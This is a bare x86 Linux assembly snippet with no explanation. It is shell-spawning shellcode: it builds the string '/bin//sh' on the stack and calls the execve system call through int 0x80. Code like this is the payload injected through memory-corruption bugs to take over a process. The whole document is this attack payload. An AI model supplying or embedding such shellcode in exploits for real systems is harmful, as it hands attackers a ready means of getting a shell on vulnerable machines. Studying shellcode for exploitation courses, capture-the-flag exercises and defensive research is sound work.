xor    ecx, ecx;
push   0xb;
pop    eax;
cdq;
push   edx;
push   0x68732f2f;
push   0x6e69622f;
xchg   ebx, esp;	// == mov ebx, esp;
int    0x80;
